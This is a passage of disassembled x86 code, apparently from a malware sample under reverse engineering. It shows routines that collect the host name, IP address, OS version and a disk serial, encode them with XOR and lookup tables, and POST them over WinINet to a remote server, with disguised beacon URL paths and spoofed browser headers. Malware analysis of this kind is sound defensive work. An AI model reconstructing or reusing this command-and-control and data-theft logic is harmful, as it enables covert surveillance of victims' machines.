                mov     esi, [esp+58h+arg_0]
                mov     edi, 8
                lea     esp, [esp+0]

loc_404030:                             ; CODE XREF: sub_403F70+120↓j
                xor     ebx, ebx
                mov     eax, esi
                mov     [esp+58h+var_14], 0Fh
                mov     [esp+58h+var_18], ebx
                mov     byte ptr [esp+58h+var_28], bl
                lea     edx, [eax+1]

loc_404047:                             ; CODE XREF: sub_403F70+DC↓j
                mov     cl, [eax]
                inc     eax
                cmp     cl, bl
                jnz     short loc_404047
                sub     eax, edx
                push    eax
                push    esi
                lea     ecx, [esp+60h+var_2C]
                call    sub_409840
                lea     edx, [esp+58h+var_2C]
                push    edx
                lea     ebx, [esp+5Ch+var_44]
                mov     byte ptr [esp+5Ch+var_4], 3
                call    sub_408850
                mov     byte ptr [esp+58h+var_4], 1
                cmp     [esp+58h+var_14], 10h
                jb      short loc_404087
                mov     eax, [esp+58h+var_28]
                push    eax
                call    sub_40F15B
                add     esp, 4

loc_404087:                             ; CODE XREF: sub_403F70+108↑j
                add     esi, 0A0h
                sub     edi, 1
                jnz     short loc_404030
                lea     ebx, [esp+58h+var_44]
                call    sub_4086A0
                mov     eax, [esp+58h+var_38]
                xor     ebx, ebx
                cmp     eax, ebx
                jz      short loc_4040E4
                mov     edi, [esp+58h+var_34]
                cmp     eax, edi
                jz      short loc_4040DB
                lea     esi, [eax+18h]

loc_4040B0:                             ; CODE XREF: sub_403F70+165↓j
                cmp     dword ptr [esi], 10h
                jb      short loc_4040C1
                mov     ecx, [esi-14h]
                push    ecx
                call    sub_40F15B
                add     esp, 4

loc_4040C1:                             ; CODE XREF: sub_403F70+143↑j
                mov     dword ptr [esi], 0Fh
                mov     [esi-4], ebx
                mov     [esi-14h], bl
                add     esi, 1Ch
                lea     edx, [esi-18h]
                cmp     edx, edi
                jnz     short loc_4040B0
                mov     eax, [esp+58h+var_38]

loc_4040DB:                             ; CODE XREF: sub_403F70+13B↑j
                push    eax
                call    sub_40F15B
                add     esp, 4

loc_4040E4:                             ; CODE XREF: sub_403F70+133↑j
                mov     eax, [esp+58h+var_44]
                push    eax
                mov     [esp+5Ch+var_38], ebx
                mov     [esp+5Ch+var_34], ebx
                mov     [esp+5Ch+var_30], ebx
                call    sub_40F15B
                add     esp, 4
                mov     ecx, [esp+58h+var_C]
                mov     large fs:0, ecx
                pop     ecx
                pop     edi
                pop     esi
                pop     ebx
                add     esp, 48h
                retn
sub_403F70      endp


; =============== S U B R O U T I N E =======================================


sub_404110      proc near               ; CODE XREF: sub_401AE0+A8↑p
                push    ecx
                push    offset aRedir   ; "redir?"
                mov     ecx, offset aBlg78newtplIma ; "/blg7_8newtpl/image/7/7_12/images/"
                call    sub_403F70
                add     esp, 4
                push    offset aFlink   ; "flink?"
                mov     ecx, offset aWidgetWidgetsW ; "/widget/widgets/wgt_static/"
                call    sub_403F70
                add     esp, 4
                push    offset aCGif    ; "c.gif?"
                mov     ecx, offset aSLcmsIddT ; "/s/lcms_/IDD/t/"
                call    sub_403F70
                add     esp, 4
                push    offset aMain    ; "main?"
                mov     ecx, offset aStatusMutiquer ; "/status/MutiqueryVP/"
                call    sub_403F70
                add     esp, 4
                push    offset aAdfshow ; "adfshow?"
                mov     ecx, offset aApiGetAttentio ; "/api/get_attention_num/"
                call    sub_403F70
                add     esp, 4
                push    offset aShowAsp ; "show.asp?"
                mov     ecx, offset aUcMyshowBlogMi ; "/uc/myshow/blog/misc/gif/"
                call    sub_403F70
                add     esp, 4
                push    offset unk_428C10
                mov     ecx, offset aA2FrontLmMiniN ; "/A2/front/lm/mini/noborder/"
                call    sub_403F70
                add     esp, 4
                push    offset aGmes    ; "gmes?"
                mov     ecx, offset aSubCgiBin ; "/sub/cgi-bin/"
                call    sub_403F70
                add     esp, 4
                push    offset aBordAspx ; "bord.aspx?"
                mov     ecx, offset aSheqPorBlomofu ; "/sheq/por/blomofun/"
                call    sub_403F70
                add     esp, 4
                push    offset aLoadSwf ; "load.swf?"
                mov     ecx, offset aComboActionBin ; "/combo.action/bin/"
                call    sub_403F70
                add     esp, 4
                push    offset aWorAsp  ; "wor.asp?"
                mov     ecx, offset aPpCoreCgi ; "/pp/core/cgi/"
                call    sub_403F70
                add     esp, 4
                push    offset aSunHtml ; "sun.html?"
                mov     ecx, offset aLoaDatabase3 ; "/loa/database3/"
                call    sub_403F70
                add     esp, 4
                pop     ecx
                retn
sub_404110      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_4041F0      proc near               ; CODE XREF: sub_401AE0+A3↑p

var_128         = byte ptr -128h
var_124         = dword ptr -124h
var_114         = dword ptr -114h
var_110         = dword ptr -110h
VersionInformation= _OSVERSIONINFOA ptr -10Ch
var_71          = byte ptr -71h
var_70          = byte ptr -70h
var_6F          = dword ptr -6Fh
var_6B          = dword ptr -6Bh
var_67          = dword ptr -67h
var_63          = dword ptr -63h
var_5F          = dword ptr -5Fh
var_5B          = dword ptr -5Bh
var_57          = dword ptr -57h
var_53          = word ptr -53h
var_51          = byte ptr -51h
var_50          = byte ptr -50h
var_4F          = byte ptr -4Fh
var_10          = dword ptr -10h
var_C           = dword ptr -0Ch
var_4           = dword ptr -4

                push    0FFFFFFFFh
                push    offset SEH_4041F0
                mov     eax, large fs:0
                push    eax
                sub     esp, 11Ch
                mov     eax, ___security_cookie
                xor     eax, esp
                mov     [esp+128h+var_10], eax
                push    ebx
                push    esi
                push    edi
                mov     eax, ___security_cookie
                xor     eax, esp
                push    eax
                lea     eax, [esp+138h+var_C]
                mov     large fs:0, eax
                xor     ebx, ebx
                push    3Fh
                lea     eax, [esp+13Ch+var_4F]
                push    ebx
                push    eax
                mov     [esp+144h+var_50], bl
                call    sub_413520
                xor     eax, eax
                add     esp, 0Ch
                push    40h
                lea     ecx, [esp+13Ch+var_50]
                push    ecx
                mov     [esp+140h+var_70], bl
                mov     [esp+140h+var_6F], eax
                mov     [esp+140h+var_6B], eax
                mov     [esp+140h+var_67], eax
                mov     [esp+140h+var_63], eax
                mov     [esp+140h+var_5F], eax
                mov     [esp+140h+var_5B], eax
                mov     [esp+140h+var_57], eax
                mov     [esp+140h+var_53], ax
                mov     [esp+140h+var_51], al
                call    WS2_32_57
                lea     edx, [esp+138h+var_50]
                push    edx
                call    WS2_32_52
                mov     eax, [eax+0Ch]
                mov     ecx, [eax]
                mov     edx, [ecx]
                push    edx
                call    WS2_32_12
                mov     edi, eax
                lea     eax, [esp+138h+VersionInformation]
                push    eax             ; lpVersionInformation
                mov     [esp+13Ch+VersionInformation.dwOSVersionInfoSize], 9Ch
                call    ds:GetVersionExA
                test    eax, eax
                jnz     short loc_4042D9
                mov     [esp+138h+var_71], 0FFh

loc_4042D9:                             ; CODE XREF: sub_4041F0+DF↑j
                push    ebx
                push    offset szProxyBypass
                lea     ecx, [esp+140h+var_128]
                mov     [esp+140h+var_110], 0Fh
                mov     [esp+140h+var_114], ebx
                mov     byte ptr [esp+140h+var_124], bl
                call    sub_409840
                mov     [esp+138h+var_4], ebx
                cmp     [esp+138h+var_114], ebx
                jz      short loc_404310
                mov     bl, 26h
                lea     esi, [esp+138h+var_128]
                call    sub_408C10

loc_404310:                             ; CODE XREF: sub_4041F0+113↑j
                push    4
                push    offset aName    ; "NAME"
                lea     eax, [esp+140h+var_128]
                call    sub_409730
                push    1
                push    offset asc_422334 ; "="
                lea     eax, [esp+140h+var_128]
                call    sub_409730
                lea     eax, [esp+138h+var_50]
                lea     edx, [eax+1]
                lea     ebx, [ebx+0]

loc_404340:                             ; CODE XREF: sub_4041F0+155↓j
                mov     cl, [eax]
                inc     eax
                test    cl, cl
                jnz     short loc_404340
                sub     eax, edx
                push    eax
                lea     ecx, [esp+13Ch+var_50]
                push    ecx
                lea     eax, [esp+140h+var_128]
                call    sub_409730
                cmp     [esp+138h+var_114], 0
                jz      short loc_40436D
                mov     bl, 26h
                lea     esi, [esp+138h+var_128]
                call    sub_408C10

loc_40436D:                             ; CODE XREF: sub_4041F0+170↑j
                push    4
                push    offset aAddr    ; "ADDR"
                lea     eax, [esp+140h+var_128]
                call    sub_409730
                push    1
                push    offset asc_422334 ; "="
                lea     eax, [esp+140h+var_128]
                call    sub_409730
                mov     eax, edi
                lea     edx, [eax+1]

loc_404392:                             ; CODE XREF: sub_4041F0+1A7↓j
                mov     cl, [eax]
                inc     eax
                test    cl, cl
                jnz     short loc_404392
                sub     eax, edx
                push    eax
                push    edi
                lea     eax, [esp+140h+var_128]
                call    sub_409730
                cmp     [esp+138h+var_114], 0
                jz      short loc_4043B8
                mov     bl, 26h
                lea     esi, [esp+138h+var_128]
                call    sub_408C10

loc_4043B8:                             ; CODE XREF: sub_4041F0+1BB↑j
                push    4
                push    offset aMark    ; "MARK"
                lea     eax, [esp+140h+var_128]
                call    sub_409730
                push    1
                push    offset asc_422334 ; "="
                lea     eax, [esp+140h+var_128]
                call    sub_409730
                mov     eax, offset unk_42C020
                lea     edx, [eax+1]

loc_4043E0:                             ; CODE XREF: sub_4041F0+1F5↓j
                mov     cl, [eax]
                inc     eax
                test    cl, cl
                jnz     short loc_4043E0
                sub     eax, edx
                push    eax
                push    offset unk_42C020
                lea     eax, [esp+140h+var_128]
                call    sub_409730
                mov     edx, [esp+138h+VersionInformation.dwMinorVersion]
                mov     eax, [esp+138h+VersionInformation.dwMajorVersion]
                push    edx
                push    eax
                lea     ecx, [esp+140h+var_70]
                push    offset aDD      ; "%d.%d"
                push    ecx
                call    sub_40E37C
                add     esp, 10h
                cmp     [esp+138h+var_114], 0
                jz      short loc_404429
                mov     bl, 26h
                lea     esi, [esp+138h+var_128]
                call    sub_408C10

loc_404429:                             ; CODE XREF: sub_4041F0+22C↑j
                push    3
                push    offset aOsv     ; "OSV"
                lea     eax, [esp+140h+var_128]
                call    sub_409730
                push    1
                push    offset asc_422334 ; "="
                lea     eax, [esp+140h+var_128]
                call    sub_409730
                lea     eax, [esp+138h+var_70]
                lea     edx, [eax+1]

loc_404453:                             ; CODE XREF: sub_4041F0+268↓j
                mov     cl, [eax]
                inc     eax
                test    cl, cl
                jnz     short loc_404453
                sub     eax, edx
                push    eax
                lea     edx, [esp+13Ch+var_70]
                push    edx
                lea     eax, [esp+140h+var_128]
                call    sub_409730
                cmp     [esp+138h+var_114], 0
                jz      short loc_404480
                mov     bl, 26h
                lea     esi, [esp+138h+var_128]
                call    sub_408C10

loc_404480:                             ; CODE XREF: sub_4041F0+283↑j
                push    4
                push    offset aHdsn    ; "HDSN"
                lea     eax, [esp+140h+var_128]
                call    sub_409730
                push    1
                push    offset asc_422334 ; "="
                lea     eax, [esp+140h+var_128]
                call    sub_409730
                mov     eax, offset byte_42C768
                lea     edx, [eax+1]

loc_4044A8:                             ; CODE XREF: sub_4041F0+2BD↓j
                mov     cl, [eax]
                inc     eax
                test    cl, cl
                jnz     short loc_4044A8
                sub     eax, edx
                push    eax
                push    offset byte_42C768
                lea     eax, [esp+140h+var_128]
                call    sub_409730
                cmp     [esp+138h+var_114], 0
                jz      short loc_4044D2
                mov     bl, 26h
                lea     esi, [esp+138h+var_128]
                call    sub_408C10

loc_4044D2:                             ; CODE XREF: sub_4041F0+2D5↑j
                push    5
                push    offset aDummy   ; "dummy"
                lea     eax, [esp+140h+var_128]
                call    sub_409730
                push    1
                push    offset asc_422334 ; "="
                lea     eax, [esp+140h+var_128]
                call    sub_409730
                push    0
                push    offset szProxyBypass
                lea     eax, [esp+140h+var_128]
                call    sub_409730
                cmp     [esp+138h+var_110], 10h
                mov     eax, [esp+138h+var_124]
                jnb     short loc_404511
                lea     eax, [esp+138h+var_124]

loc_404511:                             ; CODE XREF: sub_4041F0+31B↑j
                lea     edx, [eax+1]

loc_404514:                             ; CODE XREF: sub_4041F0+329↓j
                mov     cl, [eax]
                inc     eax
                test    cl, cl
                jnz     short loc_404514
                sub     eax, edx
                mov     ecx, eax
                mov     eax, 0AAAAAAABh
                mul     ecx
                shr     edx, 1
                lea     eax, [edx+edx*2]
                sub     ecx, eax
                cmp     ecx, 1
                jnz     short loc_40453B
                push    2
                push    offset aSy      ; "sy"
                jmp     short loc_404547
; ---------------------------------------------------------------------------

loc_40453B:                             ; CODE XREF: sub_4041F0+340↑j
                cmp     ecx, 2
                jnz     short loc_404550
                push    1
                push    offset aS       ; "s"

loc_404547:                             ; CODE XREF: sub_4041F0+349↑j
                lea     eax, [esp+140h+var_128]
                call    sub_409730

loc_404550:                             ; CODE XREF: sub_4041F0+34E↑j
                mov     esi, [esp+138h+var_110]
                mov     eax, [esp+138h+var_124]
                mov     dword_42C368, 0
                cmp     esi, 10h
                jnb     short loc_40456B
                lea     eax, [esp+138h+var_124]

loc_40456B:                             ; CODE XREF: sub_4041F0+375↑j
                mov     ecx, [esp+138h+var_114]
                push    ecx
                push    eax
                push    offset dword_42C368
                call    sub_414550
                add     esp, 0Ch
                cmp     esi, 10h
                jb      short loc_404590
                mov     edx, [esp+138h+var_124]
                push    edx
                call    sub_40F15B
                add     esp, 4

loc_404590:                             ; CODE XREF: sub_4041F0+391↑j
                mov     ecx, [esp+138h+var_C]
                mov     large fs:0, ecx
                pop     ecx
                pop     edi
                pop     esi
                pop     ebx
                mov     ecx, [esp+128h+var_10]
                xor     ecx, esp
                call    @__security_check_cookie@4 ; __security_check_cookie(x)
                add     esp, 128h
                retn
sub_4041F0      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_4045C0      proc near               ; CODE XREF: sub_402A00+23A↑p
                                        ; sub_402A00+24E↑p ...

var_14          = byte ptr -14h
var_13          = dword ptr -13h
var_F           = dword ptr -0Fh
var_B           = dword ptr -0Bh
var_7           = word ptr -7
var_5           = byte ptr -5
var_4           = dword ptr -4

                sub     esp, 14h
                mov     eax, ___security_cookie
                xor     eax, esp
                mov     [esp+14h+var_4], eax
                xor     eax, eax
                push    esi
                mov     [esp+18h+var_13], eax
                mov     [esp+18h+var_F], eax
                mov     [esp+18h+var_B], eax
                mov     [esp+18h+var_7], ax
                mov     [esp+18h+var_5], al
                push    0Ah
                lea     eax, [esp+1Ch+var_14]
                push    eax
                push    ecx
                mov     esi, edx
                mov     [esp+24h+var_14], 0
                call    sub_41E398
                add     esp, 0Ch
                cmp     dword ptr [esi+14h], 0
                jz      short loc_40460C
                push    ebx
                mov     bl, 3Bh
                call    sub_408C10
                pop     ebx

loc_40460C:                             ; CODE XREF: sub_4045C0+41↑j
                mov     eax, edi
                lea     edx, [eax+1]

loc_404611:                             ; CODE XREF: sub_4045C0+56↓j
                mov     cl, [eax]
                inc     eax
                test    cl, cl
                jnz     short loc_404611
                sub     eax, edx
                push    eax
                push    edi
                mov     eax, esi
                call    sub_409730
                push    1
                push    offset asc_422334 ; "="
                mov     eax, esi
                call    sub_409730
                lea     eax, [esp+18h+var_14]
                lea     edx, [eax+1]

loc_404638:                             ; CODE XREF: sub_4045C0+7D↓j
                mov     cl, [eax]
                inc     eax
                test    cl, cl
                jnz     short loc_404638
                sub     eax, edx
                push    eax
                lea     edx, [esp+1Ch+var_14]
                push    edx
                mov     eax, esi
                call    sub_409730
                mov     ecx, [esp+18h+var_4]
                pop     esi
                xor     ecx, esp
                call    @__security_check_cookie@4 ; __security_check_cookie(x)
                add     esp, 14h
                retn
sub_4045C0      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_404660      proc near               ; CODE XREF: sub_401E10+40D↑p
                                        ; sub_402A00+F8↑p ...

var_804         = byte ptr -804h
var_803         = byte ptr -803h
var_4           = dword ptr -4
arg_0           = dword ptr  4
arg_4           = dword ptr  8

                sub     esp, 804h
                mov     eax, ___security_cookie
                xor     eax, esp
                mov     [esp+804h+var_4], eax
                push    ebp
                mov     ebp, [esp+808h+arg_0]
                push    7FFh
                lea     eax, [esp+80Ch+var_803]
                push    0
                push    eax
                mov     [esp+814h+var_804], 0
                call    sub_413520
                add     esp, 0Ch
                xor     eax, eax
                test    esi, esi
                jbe     short loc_4046C6
                push    edi
                mov     edi, [esp+80Ch+arg_4]
                lea     ecx, [esp+80Ch+var_804]
                sub     edi, ecx
                lea     esp, [esp+0]

loc_4046B0:                             ; CODE XREF: sub_404660+63↓j
                lea     ecx, [esp+eax+80Ch+var_804]
                movzx   edx, byte ptr [edi+ecx]
                mov     dl, byte_426610[edx]
                inc     eax
                mov     [ecx], dl
                cmp     eax, esi
                jb      short loc_4046B0
                pop     edi

loc_4046C6:                             ; CODE XREF: sub_404660+39↑j
                push    esi
                lea     ecx, [esp+80Ch+var_804]
                mov     edx, ebp
                call    sub_4012C0
                mov     ecx, [esp+80Ch+var_4]
                add     esp, 4
                pop     ebp
                xor     ecx, esp
                call    @__security_check_cookie@4 ; __security_check_cookie(x)
                add     esp, 804h
                retn
sub_404660      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_4046F0      proc near               ; CODE XREF: sub_4052B0+131↓p

var_804         = byte ptr -804h
var_803         = byte ptr -803h
var_4           = dword ptr -4
arg_0           = dword ptr  4

                sub     esp, 804h
                mov     eax, ___security_cookie
                xor     eax, esp
                mov     [esp+804h+var_4], eax
                push    esi
                push    edi
                push    7FFh
                lea     eax, [esp+810h+var_803]
                push    0
                push    eax
                mov     esi, ecx
                mov     edi, edx
                mov     [esp+818h+var_804], 0
                call    sub_413520
                mov     ecx, [esp+818h+arg_0]
                push    ecx
                lea     edx, [esp+81Ch+var_804]
                push    edx
                mov     ecx, edi
                call    sub_4015A0
                mov     edi, eax
                add     esp, 14h
                test    edi, edi
                jle     short loc_404764
                lea     edx, [esp+80Ch+var_804]
                mov     ecx, esi
                sub     edx, esi
                mov     esi, edi
                jmp     short loc_404750
; ---------------------------------------------------------------------------
                align 10h

loc_404750:                             ; CODE XREF: sub_4046F0+57↑j
                                        ; sub_4046F0+70↓j
                movzx   eax, byte ptr [edx+ecx]
                mov     al, byte_426710[eax]
                mov     [ecx], al
                inc     ecx
                sub     esi, 1
                jnz     short loc_404750
                mov     eax, edi

loc_404764:                             ; CODE XREF: sub_4046F0+4B↑j
                mov     ecx, [esp+80Ch+var_4]
                pop     edi
                pop     esi
                xor     ecx, esp
                call    @__security_check_cookie@4 ; __security_check_cookie(x)
                add     esp, 804h
                retn
sub_4046F0      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_404780      proc near               ; CODE XREF: sub_403B80+130↑p

var_804         = byte ptr -804h
var_803         = byte ptr -803h
var_4           = dword ptr -4
arg_0           = byte ptr  4

                sub     esp, 804h
                mov     eax, ___security_cookie
                xor     eax, esp
                mov     [esp+804h+var_4], eax
                push    ebx
                mov     bl, [esp+808h+arg_0]
                push    7FFh
                lea     eax, [esp+80Ch+var_803]
                push    0
                push    eax
                mov     [esp+814h+var_804], 0
                call    sub_413520
                add     esp, 0Ch
                xor     eax, eax
                test    esi, esi
                jbe     short loc_4047D1
                jmp     short loc_4047C0
; ---------------------------------------------------------------------------
                align 10h

loc_4047C0:                             ; CODE XREF: sub_404780+3B↑j
                                        ; sub_404780+4F↓j
                mov     cl, byte_42C768[eax]
                xor     cl, bl
                mov     [esp+eax+808h+var_804], cl
                inc     eax
                cmp     eax, esi
                jb      short loc_4047C0

loc_4047D1:                             ; CODE XREF: sub_404780+39↑j
                push    esi
                lea     ecx, [esp+80Ch+var_804]
                mov     edx, edi
                call    sub_4012C0
                mov     ecx, [esp+80Ch+var_4]
                add     esp, 4
                pop     ebx
                xor     ecx, esp
                call    @__security_check_cookie@4 ; __security_check_cookie(x)
                add     esp, 804h
                retn
sub_404780      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_404800      proc near               ; CODE XREF: sub_401E10+775↑p

var_1030        = dword ptr -1030h
dwBufferLength  = dword ptr -102Ch
dwIndex         = dword ptr -1028h
var_1024        = byte ptr -1024h
var_1023        = dword ptr -1023h
var_101F        = dword ptr -101Fh
var_101B        = dword ptr -101Bh
var_1017        = dword ptr -1017h
var_1013        = dword ptr -1013h
var_100F        = dword ptr -100Fh
var_100B        = dword ptr -100Bh
var_1007        = word ptr -1007h
var_1005        = byte ptr -1005h
Buffer          = byte ptr -1004h
var_1003        = byte ptr -1003h
var_4           = dword ptr -4

                mov     eax, 1030h
                call    __alloca_probe
                mov     eax, ___security_cookie
                xor     eax, esp
                mov     [esp+1030h+var_4], eax
                push    ebx
                push    edi
                xor     ebx, ebx
                push    0FFFh
                lea     eax, [esp+103Ch+var_1003]
                push    ebx
                push    eax
                mov     [esp+1044h+Buffer], bl
                call    sub_413520
                add     esp, 0Ch
                mov     [esp+1038h+var_1030], 1000h
                mov     [esp+1038h+dwIndex], ebx
                mov     [esp+1038h+dwBufferLength], ebx
                cmp     esi, ebx
                jz      short loc_40488A
                mov     edi, ds:HttpQueryInfoA
                lea     ecx, [esp+1038h+dwIndex]
                push    ecx             ; lpdwIndex
                lea     edx, [esp+103Ch+dwBufferLength]
                push    edx             ; lpdwBufferLength
                push    ebx             ; lpBuffer
                push    2Bh             ; dwInfoLevel
                push    esi             ; hRequest
                call    edi ; HttpQueryInfoA
                mov     eax, [esp+1038h+dwBufferLength]
                cmp     eax, [esp+1038h+var_1030]
                ja      short loc_40488A
                call    ds:GetLastError
                cmp     eax, 7Ah
                jnz     short loc_40488A
                lea     ecx, [esp+1038h+dwIndex]
                push    ecx             ; lpdwIndex
                lea     edx, [esp+103Ch+var_1030]
                push    edx             ; lpdwBufferLength
                lea     eax, [esp+1040h+Buffer]
                push    eax             ; lpBuffer
                push    2Bh             ; dwInfoLevel
                push    esi             ; hRequest
                call    edi ; HttpQueryInfoA
                cmp     eax, ebx
                jnz     short loc_4048A3

loc_40488A:                             ; CODE XREF: sub_404800+45↑j
                                        ; sub_404800+65↑j ...
                pop     edi
                xor     eax, eax
                pop     ebx
                mov     ecx, [esp+1030h+var_4]
                xor     ecx, esp
                call    @__security_check_cookie@4 ; __security_check_cookie(x)
                add     esp, 1030h
                retn
; ---------------------------------------------------------------------------

loc_4048A3:                             ; CODE XREF: sub_404800+88↑j
                xor     eax, eax
                lea     ecx, [esp+1038h+var_1024]
                push    ecx
                mov     edx, offset aServ ; "serv"
                lea     ecx, [esp+103Ch+Buffer]
                mov     [esp+103Ch+var_1024], bl
                mov     [esp+103Ch+var_1023], eax
                mov     [esp+103Ch+var_101F], eax
                mov     [esp+103Ch+var_101B], eax
                mov     [esp+103Ch+var_1017], eax
                mov     [esp+103Ch+var_1013], eax
                mov     [esp+103Ch+var_100F], eax
                mov     [esp+103Ch+var_100B], eax
                mov     [esp+103Ch+var_1007], ax
                mov     [esp+103Ch+var_1005], al
                call    sub_404E40
                add     esp, 4
                test    eax, eax
                jz      short loc_40488A
                mov     edx, offset aSy ; "sy"
                lea     ecx, [esp+1038h+var_1024]

loc_4048F1:                             ; CODE XREF: sub_404800+10B↓j
                mov     al, [ecx]
                cmp     al, [edx]
                jnz     short loc_404911
                cmp     al, bl
                jz      short loc_40490D
                mov     al, [ecx+1]
                cmp     al, [edx+1]
                jnz     short loc_404911
                add     ecx, 2
                add     edx, 2
                cmp     al, bl
                jnz     short loc_4048F1

loc_40490D:                             ; CODE XREF: sub_404800+F9↑j
                xor     eax, eax
                jmp     short loc_404916
; ---------------------------------------------------------------------------

loc_404911:                             ; CODE XREF: sub_404800+F5↑j
                                        ; sub_404800+101↑j
                sbb     eax, eax
                sbb     eax, 0FFFFFFFFh

loc_404916:                             ; CODE XREF: sub_404800+10F↑j
                mov     ecx, [esp+1038h+var_4]
                xor     edx, edx
                cmp     eax, ebx
                setz    dl
                pop     edi
                pop     ebx
                xor     ecx, esp
                mov     eax, edx
                call    @__security_check_cookie@4 ; __security_check_cookie(x)
                add     esp, 1030h
                retn
sub_404800      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_404940      proc near               ; CODE XREF: sub_4027B0+1D5↑p

dwOptionalLength= dword ptr -40024h
Buffer          = dword ptr -40020h
dwNumberOfBytesRead= dword ptr -4001Ch
var_40018       = dword ptr -40018h
var_40014       = dword ptr -40014h
dwIndex         = dword ptr -40010h
var_4000C       = dword ptr -4000Ch
dwBufferLength  = dword ptr -40008h
var_40004       = byte ptr -40004h
var_40003       = byte ptr -40003h
var_4           = dword ptr -4
arg_0           = dword ptr  4

                mov     eax, 40024h
                call    __alloca_probe
                mov     eax, ___security_cookie
                xor     eax, esp
                mov     [esp+40024h+var_4], eax
                cmp     dword_42C344, 0
                mov     eax, [esp+40024h+arg_0]
                push    ebx
                push    ebp
                push    esi
                push    edi
                mov     [esp+40034h+dwNumberOfBytesRead], eax
                jz      short loc_40498E
                mov     edx, dword_42C7A8
                push    1               ; int
                mov     eax, offset szObjectName ; "/classic/acount/image/addr_member.asp"
                mov     ecx, offset aPost ; "POST"
                call    sub_40DFC0
                mov     ebp, eax
                jmp     loc_404A11
; ---------------------------------------------------------------------------

loc_40498E:                             ; CODE XREF: sub_404940+2E↑j
                mov     ecx, dword_42C7A8
                mov     edx, [ecx+8]
                push    0               ; dwContext
                push    84080000h       ; dwFlags
                push    0               ; lplpszAcceptTypes
                push    0               ; lpszReferrer
                push    offset szVersion ; "HTTP/1.0"
                push    offset szObjectName ; "/classic/acount/image/addr_member.asp"
                push    offset aPost    ; "POST"
                or      edi, 0FFFFFFFFh
                push    edx             ; hConnect
                mov     [esp+40054h+var_40014], edi
                mov     [esp+40054h+var_40018], edi
                call    ds:HttpOpenRequestA
                mov     ebp, eax
                test    ebp, ebp
                jz      short loc_404A0F
                mov     esi, ds:InternetSetOptionA
                push    4               ; dwBufferLength
                lea     eax, [esp+40038h+Buffer]
                push    eax             ; lpBuffer
                push    41h             ; dwOption
                push    ebp             ; hInternet
                mov     [esp+40044h+Buffer], 0
                call    esi ; InternetSetOptionA
                cmp     [esp+40034h+var_40014], edi
                jz      short loc_4049F9
                push    4               ; dwBufferLength
                lea     ecx, [esp+40038h+var_40014]
                push    ecx             ; lpBuffer
                push    6               ; dwOption
                push    ebp             ; hInternet
                call    esi ; InternetSetOptionA
                test    eax, eax
                jz      short loc_404A0F

loc_4049F9:                             ; CODE XREF: sub_404940+A7↑j
                cmp     [esp+40034h+var_40018], edi
                jz      short loc_404A11
                push    4               ; dwBufferLength
                lea     edx, [esp+40038h+var_40018]
                push    edx             ; lpBuffer
                push    5               ; dwOption
                push    ebp             ; hInternet
                call    esi ; InternetSetOptionA
                test    eax, eax
                jnz     short loc_404A11

loc_404A0F:                             ; CODE XREF: sub_404940+87↑j
                                        ; sub_404940+B7↑j
                xor     ebp, ebp

loc_404A11:                             ; CODE XREF: sub_404940+49↑j
                                        ; sub_404940+BD↑j ...
                mov     ebx, offset aX86 ; "x86"
                mov     edi, offset aUaCpu ; "UA-CPU"
                mov     esi, ebp
                call    sub_40E0B0
                mov     ebx, offset aTextHtmlQ09Tex ; "text/html;q=0.9,text/plain;q=0.8,applic"...
                mov     edi, offset aAccept ; "Accept"
                call    sub_40E0B0
                mov     ebx, offset aEnUs ; "en-us"
                mov     edi, offset aAcceptLanguage ; "Accept-Language"
                call    sub_40E0B0
                mov     ebx, offset aGzipQ08Deflate ; "gzip;q=0.8, deflate;q=0.5"
                mov     edi, offset aAcceptEncoding ; "Accept-Encoding"
                call    sub_40E0B0
                mov     ebx, offset aMultipartFormD ; "multipart/form-data; boundary=---------"...
                mov     edi, offset aContentType ; "Content-Type"
                call    sub_40E0B0
                mov     edi, [esp+40034h+dwNumberOfBytesRead]
                mov     eax, [edi+14h]
                lea     eax, [eax+eax*4]
                push    eax
                call    sub_40E2DB
                mov     ecx, [edi+14h]
                push    ecx
                xor     ebx, ebx
                mov     esi, eax
                push    ebx
                push    esi
                call    sub_413520
                mov     edx, [edi+14h]
                push    edi
                lea     edi, [esp+40048h+dwOptionalLength]
                mov     [esp+40048h+dwOptionalLength], edx
                call    sub_405210
                add     esp, 14h
                test    eax, eax
                jz      loc_404BC6
                mov     eax, [esp+40034h+dwOptionalLength]
                mov     edi, dword_42C7A8
                push    eax             ; dwOptionalLength
                push    esi             ; lpOptional
                push    ebx             ; dwHeadersLength
                push    ebx             ; lpszHeaders
                push    ebp             ; hRequest
                call    ds:HttpSendRequestA
                test    eax, eax
                jnz     short loc_404AD5
                call    ds:GetLastError
                mov     [edi], eax
                cmp     ebp, ebx
                jz      short loc_404AC5
                push    ebp             ; hInternet
                call    ds:InternetCloseHandle

loc_404AC5:                             ; CODE XREF: sub_404940+17C↑j
                push    esi
                call    sub_40F15B
                add     esp, 4
                xor     eax, eax
                jmp     loc_404BD6
; ---------------------------------------------------------------------------

loc_404AD5:                             ; CODE XREF: sub_404940+170↑j
                push    esi
                call    sub_40F15B
                add     esp, 4
                mov     [esp+40034h+dwIndex], ebx
                mov     [esp+40034h+dwBufferLength], 4
                cmp     ebp, ebx
                jz      loc_404BD1
                lea     ecx, [esp+40034h+dwIndex]
                push    ecx             ; lpdwIndex
                lea     edx, [esp+40038h+dwBufferLength]
                push    edx             ; lpdwBufferLength
                lea     eax, [esp+4003Ch+var_4000C]
                push    eax             ; lpBuffer
                push    20000013h       ; dwInfoLevel
                push    ebp             ; hRequest
                call    ds:HttpQueryInfoA
                cmp     eax, ebx
                jz      loc_404BC6
                cmp     [esp+40034h+var_4000C], 0C8h
                jnz     loc_404BC6
                push    ebp
                lea     edx, [esp+40038h+Buffer]
                mov     [esp+40038h+Buffer], ebx
                call    sub_40E1A0
                cmp     eax, ebx
                jz      loc_404BC6
                push    3FFFFh
                lea     ecx, [esp+40038h+var_40003]
                push    ebx
                push    ecx
                mov     [esp+40040h+dwNumberOfBytesRead], ebx
                xor     edi, edi
                mov     [esp+40040h+var_40004], bl
                call    sub_413520
